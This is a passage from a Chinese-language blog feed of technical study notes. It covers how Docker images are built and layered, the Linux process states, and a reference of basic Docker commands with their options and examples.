class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker import \</span><br><span class="line">    http://download.openvz.org/template/precreated/ubuntu-14.04-x86_64-minimal.tar.gz \</span><br><span class="line">    openvz/ubuntu:14.04</span><br></pre></td></tr></table></figure><p>这条命令自动下载了 <code>ubuntu-14.04-x86_64-minimal.tar.gz</code> 文件，并且作为根文件系统展开导入，并保存为镜像 <code>openvz/ubuntu:14.04</code>。</p><h2 id="四、镜像的实现原理"><a href="#四、镜像的实现原理" class="headerlink" title="四、镜像的实现原理"></a>四、镜像的实现原理</h2><p>Docker 镜像是怎么实现增量的修改和维护的？</p><p>每个镜像都由很多层次构成，Docker 使用 <a href="http://en.wikipedia.org/wiki/UnionFS">Union FS</a> 将这些不同的层结合到一个镜像中去。</p><p>通常 Union FS 有两个用途, 一方面可以实现不借助 LVM、RAID 将多个 disk 挂到同一个目录下,另一个更常用的就是将一个只读的分支和一个可写的分支联合在一起，Live CD 正是基于此方法可以允许在镜像不变的基础上允许用户在其上进行一些写操作。</p><p>Docker 在 AUFS 上构建的容器也是利用了类似的原理。</p><p><strong>参考文档：</strong></p><ul><li><code>使用 Dockerfile 定制镜像</code>：<a href="https://yeasy.gitbooks.io/docker_practice/image/build.html">https://yeasy.gitbooks.io/docker_practice/image/build.html</a></li><li><code>Dockerfie</code> 官方文档：<a href="https://docs.docker.com/engine/reference/builder/">https://docs.docker.com/engine/reference/builder/</a></li><li><code>Dockerfile</code> 最佳实践文档：<a href="https://docs.docker.com/engine/userguide/eng-image/dockerfile_best-practices/">https://docs.docker.com/engine/userguide/eng-image/dockerfile_best-practices/</a></li><li><code>Docker</code> 官方镜像 <code>Dockerfile</code>：<a href="https://github.com/docker-library/docs">https://github.com/docker-library/docs</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Tools </tag>
            
            <tag> Docker </tag>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux进程的状态解析</title>
      <link href="/2017/10/10/linux-process-state/"/>
      <url>/2017/10/10/linux-process-state/</url>
      
        <content type="html"><![CDATA[<h2 id="一、状态解析"><a href="#一、状态解析" class="headerlink" title="一、状态解析"></a>一、状态解析</h2><h3 id="1-1、状态"><a href="#1-1、状态" class="headerlink" title="1.1、状态"></a>1.1、状态</h3><ul><li><code>R(TASK_RUNNING)</code>：可执行状态</li><li><code>S(TASK_INTERRUPTIBLE)</code>：可中断的睡眠状态</li><li><code>D(TASK_UNINTERRUPTIBLE)</code>：不可中断的睡眠状态</li><li><code>T(TASK_STOPPED/TASK_TRACED)</code>：停止状态或者跟踪状态</li><li><code>Z(TASK_DEAD - EXIT_ZOMBIE)</code>：退出状态(进程成为僵尸状态)</li><li><code>X(TASK_DEAD - EXIT_DEAD)</code>：退出状态(进程即将被销毁,基本很少见)</li><li><code>W(TASK_SWAP)</code>：进入内存交换(从内核2.6开始无效)</li></ul><p><strong>其他状态(可通过ps等指令查看到)</strong></p><ul><li><code>&lt;</code>：较高优先级的进程</li><li><code>N</code>：较低优先级的进程</li><li><code>L</code>：数据页被锁进内存</li><li><code>s</code>：包含子进程</li><li><code>l</code>：多线程，克隆线程</li><li><code>+</code>：位于后台的进程组</li></ul><h3 id="1-2、状态解析"><a href="#1-2、状态解析" class="headerlink" title="1.2、状态解析"></a>1.2、状态解析</h3><h4 id="1-2-1、R-TASK-RUNNING-可执行状态"><a href="#1-2-1、R-TASK-RUNNING-可执行状态" class="headerlink" title="1.2.1、R(TASK_RUNNING) - 可执行状态"></a>1.2.1、R(TASK_RUNNING) - 可执行状态</h4><p>只有在该状态的进程才可能在CPU上运行，同一时刻可能有多个进程处于可执行状态，这些进程的task_struct结构（进程控制块）被放入对应CPU的可执行队列中（一个进程最多只能出现在一个CPU的可执行队列中）。进程调度器的任务就是从各个CPU的可执行队列中分别选择一个进程在该CPU上运行。很多操作系统教科书将正在CPU上执行的进程定义为<code>RUNNING状态</code>、而将可执行但是尚未被调度执行的进程定义为<code>READY状态</code>，这两种状态在linux下统一为<code>TASK_RUNNING状态</code></p><h4 id="1-2-2、S-TASK-INTERRUPTIBLE-可中断的睡眠状态"><a href="#1-2-2、S-TASK-INTERRUPTIBLE-可中断的睡眠状态" class="headerlink" title="1.2.2、S(TASK_INTERRUPTIBLE) - 可中断的睡眠状态"></a>1.2.2、S(TASK_INTERRUPTIBLE) - 可中断的睡眠状态</h4><p>处于这个状态的进程因为等待某些事件的发生（比如等待socket连接、等待信号量）而被挂起。这些进程的task_struct结构被放入对应事件的等待队列中。当这些事件发生时（由外部中断或其他进程触发），对应的等待队列中的一个或多个进程将被唤醒。通过ps命令我们会看到，一般情况下，进程列表中的绝大多数进程都处于<code>TASK_INTERRUPTIBLE状态</code>（除非机器的负载很高）。</p><h4 id="1-2-3、D-TASK-UNINTERRUPTIBLE-不可中断的睡眠状态"><a href="#1-2-3、D-TASK-UNINTERRUPTIBLE-不可中断的睡眠状态" class="headerlink" title="1.2.3、D(TASK_UNINTERRUPTIBLE) - 不可中断的睡眠状态"></a>1.2.3、D(TASK_UNINTERRUPTIBLE) - 不可中断的睡眠状态</h4><p>与<code>TASK_INTERRUPTIBLE状态</code>类似，进程处于睡眠状态，但是此刻进程是不可中断的。不可中断，指的并不是CPU不响应外部硬件的中断，而是指进程不响应异步信号。绝大多数情况下，进程处在睡眠状态时，总是应该能够响应异步信号的。否则你将惊奇的发现，<code>kill -9</code>竟然杀不死一个正在睡眠的进程了。于是我们也很好理解，为什么ps命令看到的进程几乎不会出现<code>TASK_UNINTERRUPTIBLE状态</code>，而总是<code>TASK_INTERRUPTIBLE状态</code>。<code>TASK_UNINTERRUPTIBLE状态</code>存在的意义就在于，内核的某些处理流程是不能被打断的。如果响应异步信号，程序的执行流程中就会被插入一段用于处理异步信号的流程（这个插入的流程可能只存在于内核态，也可能延伸到用户态），于是原有的流程就被中断了。</p><p>在进程对某些硬件进行操作时（比如进程调用read系统调用对某个设备文件进行读操作，而read系统调用最终执行到对应设备驱动的代码，并与对应的物理设备进行交互），可能需要使用<code>TASK_UNINTERRUPTIBLE状态</code>对进程进行保护，以避免进程与设备交互的过程被打断，造成设备陷入不可控的状态。这种情况下的<code>TASK_UNINTERRUPTIBLE状态</code>总是非常短暂的，通过ps命令基本上不可能捕捉到。</p><p>linux系统中也存在容易捕捉的<code>TASK_UNINTERRUPTIBLE状态</code>，在执行vfork系统调用后，父进程将进入<code>TASK_UNINTERRUPTIBLE状态</code>，直到子进程调用exit或exec(参见《神奇的vfork》)</p><h4 id="1-2-4、T-TASK-STOPPED-or-TASK-TRACED-暂停状态或跟踪状态"><a href="#1-2-4、T-TASK-STOPPED-or-TASK-TRACED-暂停状态或跟踪状态" class="headerlink" title="1.2.4、T(TASK_STOPPED or TASK_TRACED) - 暂停状态或跟踪状态"></a>1.2.4、T(TASK_STOPPED or TASK_TRACED) - 暂停状态或跟踪状态</h4><p>向进程发送一个<code>SIGSTOP信号</code>，它就会因响应该信号而进入<code>TASK_STOPPED状态</code>（除非该进程本身处于<code>TASK_UNINTERRUPTIBLE状态</code>而不响应信号，<code>SIGSTOP</code>与<code>SIGKILL</code>都是非常强制的，不允许用户进程通过signal系列的系统调用重新设置对应的信号处理函数）。<br>向进程发送一个<code>SIGCONT信号</code>，可以让其从<code>TASK_STOPPED状态</code>恢复到<code>TASK_RUNNING状态</code>。当进程正在被跟踪时，它处于<code>TASK_TRACED</code>这个特殊的状态。”正在被跟踪”指的是进程暂停下来，等待跟踪它的进程对它进行操作。比如在gdb中对被跟踪的进程下一个断点，进程在断点处停下来的时候就处于<code>TASK_TRACED状态</code>。而在其他时候，被跟踪的进程还是处于前面提到的那些状态。</p><p>对于进程本身来说<code>TASK_STOPPED</code>和<code>TASK_TRACED</code>很类似，都是表示进程暂停下来。而<code>TASK_TRACED状态</code>相当于在<code>TASK_STOPPED</code>之上多了一层保护，处于<code>TASK_TRACED状态</code>的进程不能响应<code>SIGCONT信号</code>而被唤醒。只能等到调试进程通过<code>ptrace</code>系统调用执行<code>PTRACE_CONT</code>、<code>PTRACE_DETACH</code>等操作（通过ptrace系统调用的参数指定操作），或调试进程退出，被调试的进程才能恢复<code>TASK_RUNNING状态</code></p><h4 id="1-2-5、Z-TASK-DEAD-EXIT-ZOMBIE-退出状态-进程成为僵尸状态"><a href="#1-2-5、Z-TASK-DEAD-EXIT-ZOMBIE-退出状态-进程成为僵尸状态" class="headerlink" title="1.2.5、Z(TASK_DEAD - EXIT_ZOMBIE) - 退出状态(进程成为僵尸状态)"></a>1.2.5、Z(TASK_DEAD - EXIT_ZOMBIE) - 退出状态(进程成为僵尸状态)</h4><p>进程在退出的过程中，处于<code>TASK_DEAD状态</code>。在这个退出过程中，进程占有的所有资源将被回收，除了<code>task_struct结构</code>（以及少数资源）以外。于是进程就只剩下<code>task_struct</code>这么个空壳，故称为僵尸。之所以保留<code>task_struct</code>是因为<code>task_struct</code>里面保存了进程的退出码、以及一些统计信息。而其父进程很可能会关心这些信息。比如在<code>shell</code>中的<code>$?变量</code>就保存了最后一个退出的前台进程的退出码，而这个退出码往往被作为if语句的判断条件。</p><p>当然，内核也可以将这些信息保存在别的地方，而将<code>task_struct</code>结构释放掉，以节省一些空间。但是使用<code>task_struct</code>结构更为方便，因为在内核中已经建立了从<code>pid</code>到<code>task_struct</code>查找关系，还有进程间的父子关系。释放掉<code>task_struct</code>则需要建立一些新的数据结构，以便让父进程找到它的子进程的退出信息。</p><p>父进程可以通过<code>wait系列</code>的系统调用（如<code>wait4</code>、<code>waitid</code>）来等待某个或某些子进程的退出，并获取它的退出信息。然后<code>wait系列</code>的系统调用会顺便将子进程的尸体<code>task_struct</code>也释放掉。子进程在退出的过程中，内核会给其父进程发送一个信号，通知父进程来”收尸”。这个信号默认是<code>SIGCHLD</code>，但是在通过clone系统调用创建子进程时，可以设置这个信号。</p><h4 id="1-2-5、X-TASK-DEAD-EXIT-DEAD-退出状态-进程即将被销毁"><a href="#1-2-5、X-TASK-DEAD-EXIT-DEAD-退出状态-进程即将被销毁" class="headerlink" title="1.2.5、X(TASK_DEAD - EXIT_DEAD) - 退出状态(进程即将被销毁)"></a>1.2.5、X(TASK_DEAD - EXIT_DEAD) - 退出状态(进程即将被销毁)</h4><p>进程在退出过程中也可能不会保留它的<code>task_struct</code>。比如这个进程是多线程程序中被<code>detach</code>过的进程，或者父进程通过设置<code>SIGCHLD信号</code>的<code>handler</code>为<code>SIG_IGN</code>，显式的忽略了<code>SIGCHLD信号</code>（这是posix的规定，尽管子进程的退出信号可以被设置为<code>SIGCHLD</code>以外的其他信号）。此时，进程将被置于<code>EXIT_DEAD</code>退出状态，这意味着接下来的代码立即就会将该进程彻底释放。所以<code>EXIT_DEAD状态</code>是非常短暂的，几乎不可能通过ps命令捕捉到。</p><h2 id="二、进程的基本状态"><a href="#二、进程的基本状态" class="headerlink" title="二、进程的基本状态"></a>二、进程的基本状态</h2><h3 id="2-1、三种基本状态"><a href="#2-1、三种基本状态" class="headerlink" title="2.1、三种基本状态"></a>2.1、三种基本状态</h3><p>进程在运行中不断地改变其运行状态，通常一个运行进程必须具有以下三种基本状态。</p><ul><li><code>就绪状态(Ready)</code>：当进程已分配到除CPU以外的所有必要的资源，只要获得处理机便可立即执行，这时的进程状态称为就绪状态。</li><li><code>执行状态(Running)</code>：当进程已获得处理机，其程序正在处理机上执行，此时的进程状态称为执行状态。</li><li><code>阻塞状态(Blocked)</code>：正在执行的进程，由于等待某个事件发生而无法执行时，便放弃处理机而处于阻塞状态。引起进程阻塞的事件可有多种，例如，等待I&#x2F;O完成、申请缓冲区不能满足、等待信件(信号)等。</li></ul><h3 id="2-2、三种基本状态的转换"><a href="#2-2、三种基本状态的转换" class="headerlink" title="2.2、三种基本状态的转换"></a>2.2、三种基本状态的转换</h3><p>一个进程在运行期间，不断地从一种状态转换到另一种状态，它可以多次处于就绪状态和执行状态，也可以多次处于阻塞状态。</p><ul><li><code>就绪 =&gt; 执行</code>：处于就绪状态的进程，当进程调度程序为之分配了处理机后，该进程便由就绪状态转变成执行状态。</li><li><code>执行 =&gt; 就绪</code>：处于执行状态的进程在其执行过程中，因分配给它的一个时间片已用完而不得不让出处理机，于是进程从执行状态转变成就绪状态。</li><li><code>执行 =&gt; 阻塞</code>：正在执行的进程因等待某种事件发生而无法继续执行时，便从执行状态变成阻塞状态。</li><li><code>阻塞 =&gt; 就绪</code>：处于阻塞状态的进程，若其等待的事件已经发生，于是进程由阻塞状态转变为就绪状态。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker入门篇-Docker学习笔记</title>
      <link href="/2017/10/01/docker-1/"/>
      <url>/2017/10/01/docker-1/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简述"><a href="#一、简述" class="headerlink" title="一、简述"></a>一、简述</h2><p>Docker 使用 Google 公司推出的 <a href="https://golang.org/">Go 语言</a> 进行开发实现，基于 Linux 内核的 <a href="https://zh.wikipedia.org/wiki/Cgroups">cgroup</a>，<a href="https://en.wikipedia.org/wiki/Linux_namespaces">namespace</a>，以及 <a href="https://en.wikipedia.org/wiki/Aufs">AUFS</a> 类的 <a href="https://en.wikipedia.org/wiki/Union_mount">Union FS</a> 等技术，对进程进行封装隔离，属于 <a href="https://en.wikipedia.org/wiki/Operating-system-level_virtualization">操作系统层面的虚拟化技术</a>。由于隔离的进程独立于宿主和其它的隔离的进程，因此也称其为容器。最初实现是基于 <a href="https://linuxcontainers.org/lxc/introduction/">LXC</a>，从 0.7 版本以后开始去除 LXC，转而使用自行开发的 <a href="https://github.com/docker/libcontainer">libcontainer</a>，从 1.11 开始，则进一步演进为使用 <a href="https://github.com/opencontainers/runc">runC</a> 和 <a href="https://github.com/containerd/containerd">containerd</a>。</p><h2 id="二、Docker架构"><a href="#二、Docker架构" class="headerlink" title="二、Docker架构"></a>二、Docker架构</h2><p>Docker 使用客户端-服务器 (C&#x2F;S) 架构模式，使用远程API来管理和创建Docker容器。Docker 容器通过 Docker 镜像来创建。容器与镜像的关系类似于面向对象编程中的对象与类。</p><ul><li>Docker 镜像(Images)：Docker 镜像是用于创建 Docker 容器的模板；</li><li>Docker 容器(Container)：容器是独立运行的一个或一组应用；</li><li>Docker 客户端(Client)：Docker 客户端通过命令行或者其他工具使用 Docker API (<a href="https://docs.docker.com/reference/api/docker_remote_api">https://docs.docker.com/reference/api/docker_remote_api</a>) 与 Docker 的守护进程通信；</li><li>Docker 主机(Host)：一个物理或者虚拟的机器用于执行 Docker 守护进程和容器；</li><li>Docker 仓库(Registry)：Docker 仓库用来保存镜像，可以理解为代码控制中的代码仓库，Docker Hub(<a href="https://hub.docker.com/">https://hub.docker.com</a>) 提供了庞大的镜像集合供使用；</li><li>Docker Machine：Docker Machine是一个简化Docker安装的命令行工具，通过一个简单的命令行即可在相应的平台上安装Docker，比如VirtualBox、 Digital Ocean、Microsoft Azure；</li></ul><h2 id="三、Docker基本指令"><a href="#三、Docker基本指令" class="headerlink" title="三、Docker基本指令"></a>三、Docker基本指令</h2><h3 id="3-1、容器生命周期管理"><a href="#3-1、容器生命周期管理" class="headerlink" title="3.1、容器生命周期管理"></a>3.1、容器生命周期管理</h3><h4 id="3-1-1、Run命令"><a href="#3-1-1、Run命令" class="headerlink" title="3.1.1、Run命令"></a>3.1.1、Run命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run [OPTIONS] IMAGE [COMMAND] [ARG...]：创建一个新的容器并运行一个命令</span><br><span class="line"></span><br><span class="line">Options：</span><br><span class="line">-a stdin: 指定标准输入输出内容类型，可选 STDIN/STDOUT/STDERR 三项；</span><br><span class="line">-d: 后台运行容器，并返回容器ID；</span><br><span class="line">-i: 以交互模式运行容器，通常与 -t 同时使用；</span><br><span class="line">-p: 端口映射，格式为：主机(宿主)端口:容器端口</span><br><span class="line">-t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用；</span><br><span class="line">--name=<span class="string">&quot;nginx-lb&quot;</span>: 为容器指定一个名称；</span><br><span class="line">--dns 8.8.8.8: 指定容器使用的DNS服务器，默认和宿主一致；</span><br><span class="line">--dns-search example.com: 指定容器DNS搜索域名，默认和宿主一致；</span><br><span class="line">-h <span class="string">&quot;mars&quot;</span>: 指定容器的hostname；</span><br><span class="line">-e username=<span class="string">&quot;ritchie&quot;</span>: 设置环境变量；</span><br><span class="line">--env-file=[]: 从指定文件读入环境变量；</span><br><span class="line">--cpuset=<span class="string">&quot;0-2&quot;</span> or --cpuset=<span class="string">&quot;0,1,2&quot;</span>: 绑定容器到指定CPU运行；</span><br><span class="line">-m :设置容器使用内存最大值；</span><br><span class="line">--net=<span class="string">&quot;bridge&quot;</span>: 指定容器的网络连接类型，支持 bridge/host/none/container: 四种类型；</span><br><span class="line">--<span class="built_in">link</span>=[]: 添加链接到另一个容器；</span><br><span class="line">--expose=[]: 开放一个端口或一组端口；</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">docker run --name mynginx -d nginx:latest</span><br><span class="line">docker run -P -d nginx:latest</span><br><span class="line">docker run -p 80:80 -v /data:/data -d nginx:latest</span><br><span class="line">docker run -p 127.0.0.1:80:8080/tcp ubuntu bash</span><br></pre></td></tr></table></figure><h4 id="3-1-2、容器启停命令"><a href="#3-1-2、容器启停命令" class="headerlink" title="3.1.2、容器启停命令"></a>3.1.2、容器启停命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ddocker start [OPTIONS] CONTAINER [CONTAINER...] :启动一个或多个已经被停止的容器</span><br><span class="line">docker stop [OPTIONS] CONTAINER [CONTAINER...] :停止一个运行中的容器</span><br><span class="line">docker restart [OPTIONS] CONTAINER [CONTAINER...] :重启容器</span><br></pre></td></tr></table></figure><h4 id="3-1-3、kill-命令"><a href="#3-1-3、kill-命令" class="headerlink" title="3.1.3、kill 命令"></a>3.1.3、kill 命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">kill</span> [OPTIONS] CONTAINER [CONTAINER...]:杀掉一个运行中的容器</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">-s :向容器发送一个信号</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">docker <span class="built_in">kill</span> -s KILL mynginx</span><br></pre></td></tr></table></figure><h4 id="3-1-4、rm-命令"><a href="#3-1-4、rm-命令" class="headerlink" title="3.1.4、rm 命令"></a>3.1.4、rm 命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> [OPTIONS] CONTAINER [CONTAINER...]:删除一个或多少容器</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">-f :通过SIGKILL信号强制删除一个运行中的容器;</span><br><span class="line">-l :移除容器间的网络连接，而非容器本身;</span><br><span class="line">-v :-v 删除与容器关联的卷;</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">docker <span class="built_in">rm</span> -f db01 db02</span><br><span class="line">docker <span class="built_in">rm</span> -l db</span><br><span class="line">docker <span class="built_in">rm</span> -v nginx01</span><br></pre></td></tr></table></figure><h4 id="3-1-5、pause-x2F-unpause-命令"><a href="#3-1-5、pause-x2F-unpause-命令" class="headerlink" title="3.1.5、pause&#x2F;unpause 命令"></a>3.1.5、pause&#x2F;unpause 命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pause [OPTIONS] CONTAINER [CONTAINER...] :暂停容器中所有的进程</span><br><span class="line">docker unpause [OPTIONS] CONTAINER [CONTAINER...] :恢复容器中所有的进程</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">docker pause db01</span><br><span class="line">docker unpause db01</span><br></pre></td></tr></table></figure><h4 id="3-1-6、create-命令"><a href="#3-1-6、create-命令" class="headerlink" title="3.1.6、create 命令"></a>3.1.6、create 命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker create [OPTIONS] IMAGE [COMMAND] [ARG...]：创建一个新的容器但不启动它</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">docker create  --name myrunoob  nginx:latest</span><br></pre></td></tr></table></figure><h4 id="3-1-7、exec-命令"><a href="#3-1-7、exec-命令" class="headerlink" title="3.1.7、exec 命令"></a>3.1.7、exec 命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> [OPTIONS] CONTAINER COMMAND [ARG...]：在运行的容器中执行命令</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">-d :分离模式: 在后台运行</span><br><span class="line">-i :即使没有附加也保持STDIN 打开</span><br><span class="line">-t :分配一个伪终端</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">docker <span class="built_in">exec</span> -it mynginx /bin/sh /root/runoob.sh</span><br><span class="line">docker <span class="built_in">exec</span> -i -t  mynginx /bin/bash</span><br></pre></td></tr></table></figure><h3 id="3-2、容器操作"><a href="#3-2、容器操作" class="headerlink" title="3.2、容器操作"></a>3.2、容器操作</h3><h4 id="3-2-1、ps-命令"><a href="#3-2-1、ps-命令" class="headerlink" title="3.2.1、ps 命令"></a>3.2.1、ps 命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps [OPTIONS]:列出容器</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">-a :显示所有的容器，包括未运行的；</span><br><span class="line">-f :根据条件过滤显示的内容；</span><br><span class="line">--format :指定返回值的模板文件；</span><br><span class="line">-l :显示最近创建的容器；</span><br><span class="line">-n :列出最近创建的n个容器；</span><br><span class="line">--no-trunc :不截断输出；</span><br><span class="line">-q :静默模式，只显示容器编号；</span><br><span class="line">-s :显示总的文件大小；</span><br><span class="line"></span><br><span class="line">Example:</span><br><span class="line">docker ps -n 5</span><br><span class="line">docker ps -a -q</span><br></pre></td></tr></table></figure><h4 id="3-2-2、inspect-命令"><a href="#3-2-2、inspect-命令" class="headerlink" title="3.2.2、inspect 命令"></a>3.2.2、inspect 命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker inspect [OPTIONS] NAME|ID [NAME|ID...]: 获取容器/镜像的元数据</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">-f :指定返回值的模板文件;</span><br><span class="line">-s :显示总的文件大小;</span><br><span class="line">--<span class="built_in">type</span> :为指定类型返回JSON;</span><br><span class="line"></span><br><span class="line">Example:</span><br><span class="line">docker inspect mysql:5.6</span><br><span class="line">docker inspect --format=<span class="string">&#x27;&#123;&#123;range .NetworkSettings.Networks&#125;&#125;&#123;&#123;.IPAddress&#125;&#125;&#123;&#123;end&#125;&#125;&#x27;</span> mymysql</span><br></pre></td></tr></table></figure><h4 id="3-2-3、top-命令"><a href="#3-2-3、top-命令" class="headerlink" title="3.2.3、top 命令"></a>3.2.3、top 命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker top [OPTIONS] CONTAINER [ps OPTIONS] :查看容器中运行的进程信息，支持 ps 命令参数</span><br><span class="line"></span><br><span class="line">Example:</span><br><span class="line">docker top mymysql</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span>  `docker ps |grep Up|awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>`;<span class="keyword">do</span> <span class="built_in">echo</span> \ &amp;&amp;docker top <span class="variable">$i</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure><h4 id="3-2-4、attach-命令"><a href="#3-2-4、attach-命令" class="headerlink" title="3.2.4、attach 命令"></a>3.2.4、attach 命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker attach [OPTIONS] CONTAINER :连接到正在运行中的容器</span><br><span class="line"></span><br><span class="line">Example:</span><br><span class="line">docker attach --sig-proxy=<span class="literal">false</span> mynginx</span><br></pre></td></tr></table></figure><h4 id="3-2-5、events-命令"><a href="#3-2-5、events-命令" class="headerlink" title="3.2.5、events 命令"></a>3.2.5、events 命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker events [OPTIONS]: 从服务器获取实时事件</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">-f ：根据条件过滤事件；</span><br><span class="line">--since ：从指定的时间戳后显示所有事件;</span><br><span class="line">--until ：流水时间显示到指定的时间为止；</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">docker events  --since=<span class="string">&quot;1467302400&quot;</span></span><br><span class="line">docker events -f <span class="string">&quot;image&quot;</span>=<span class="string">&quot;mysql:5.6&quot;</span> --since=<span class="string">&quot;1467302400&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="3-2-6、logs-命令"><a href="#3-2-6、logs-命令" class="headerlink" title="3.2.6、logs 命令"></a>3.2.6、logs 命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker logs [OPTIONS] CONTAINER : 获取容器的日志</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">-f : 跟踪日志输出</span><br><span class="line">--since :显示某个开始时间的所有日志</span><br><span class="line">-t : 显示时间戳</span><br><span class="line">--<span class="built_in">tail</span> :仅列出最新N条容器日志</span><br><span class="line"></span><br><span class="line">Example:</span><br><span class="line">docker logs -f mynginx</span><br><span class="line">docker logs --since=<span class="string">&quot;2016-07-01&quot;</span> --<span class="built_in">tail</span>=10 mynginx</span><br></pre></td></tr></table></figure><h3 id="3-2-7、wait-命令"><a href="#3-2-7、wait-命令" class="headerlink" title="3.2.7、wait 命令"></a>3.2.7、wait 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">wait</span> [OPTIONS] CONTAINER [CONTAINER...]: 阻塞运行直到容器停止，然后打印出它的退出代码</span><br><span class="line"></span><br><span class="line">Example:</span><br><span class="line">docker <span class="built_in">wait</span> CONTAINER</span><br></pre></td></tr></table></figure><h3 id="3-2-8、export-命令"><a href="#3-2-8、export-命令" class="headerlink" title="3.2.8、export 命令"></a>3.2.8、export 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">export</span> [OPTIONS] CONTAINER:将文件系统作为一个tar归档文件导出到STDOUT</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">-o :将输入内容写到文件</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">docker <span class="built_in">export</span> -o mysql-`<span class="built_in">date</span> +%Y%m%d`.tar a404c6c174a2</span><br></pre></td></tr></table></figure><h3 id="3-2-9、port-命令"><a href="#3-2-9、port-命令" class="headerlink" title="3.2.9、port 命令"></a>3.2.9、port 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker port [OPTIONS] CONTAINER [PRIVATE_PORT[/PROTO]]:列出指定的容器的端口映射，或者查找将PRIVATE_PORT NAT到面向公众的端口</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">docker port mymysql</span><br></pre></td></tr></table></figure><h2 id="3-3、容器rootfs命令"><a href="#3-3、容器rootfs命令" class="headerlink" title="3.3、容器rootfs命令"></a>3.3、容器rootfs命令</h2><h3 id="3-3-1、commit-命令"><a href="#3-3-1、commit-命令" class="headerlink" title="3.3.1、commit 命令"></a>3.3.1、commit 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]::从容器创建一个新的镜像</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">-a :提交的镜像作者；</span><br><span class="line">-c :使用Dockerfile指令来创建镜像；</span><br><span class="line">-m :提交时的说明文字；</span><br><span class="line">-p :在commit时，将容器暂停;</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">docker commit -a <span class="string">&quot;runoob.com&quot;</span> -m <span class="string">&quot;my apache&quot;</span> a404c6c174a2  mymysql:v1</span><br><span class="line">docker images mymysql:v1</span><br></pre></td></tr></table></figure><h3 id="3-3-2、cp-命令"><a href="#3-3-2、cp-命令" class="headerlink" title="3.3.2、cp 命令"></a>3.3.2、cp 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">用于容器与主机之间的数据拷贝</span><br><span class="line">docker <span class="built_in">cp</span> [OPTIONS] CONTAINER:SRC_PATH DEST_PATH|-</span><br><span class="line">docker <span class="built_in">cp</span> [OPTIONS] SRC_PATH|- CONTAINER:DEST_PATH</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">-L :保持源目标中的链接</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">docker <span class="built_in">cp</span> /www/runoob 96f7f14e99ab:/www/</span><br><span class="line">docker <span class="built_in">cp</span> /www/runoob 96f7f14e99ab:/www</span><br><span class="line">docker <span class="built_in">cp</span>  96f7f14e99ab:/www /tmp/</span><br></pre></td></tr></table></figure><h3 id="3-3-3、diff-命令"><a href="#3-3-3、diff-命令" class="headerlink" title="3.3.3、diff 命令"></a>3.3.3、diff 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker diff [OPTIONS] CONTAINER : 检查容器里文件结构的更改</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">docker diff mymysql</span><br></pre></td></tr></table></figure><h2 id="3-4、镜像仓库"><a href="#3-4、镜像仓库" class="headerlink" title="3.4、镜像仓库"></a>3.4、镜像仓库</h2><h3 id="3-4-1、login-x2F-logout-命令"><a href="#3-4-1、login-x2F-logout-命令" class="headerlink" title="3.4.1、login&#x2F;logout 命令"></a>3.4.1、login&#x2F;logout 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker login [OPTIONS] [SERVER]: 登陆到一个Docker镜像仓库</span><br><span class="line">docker <span class="built_in">logout</span> [OPTIONS] [SERVER]: 登出一个Docker镜像仓库</span><br><span 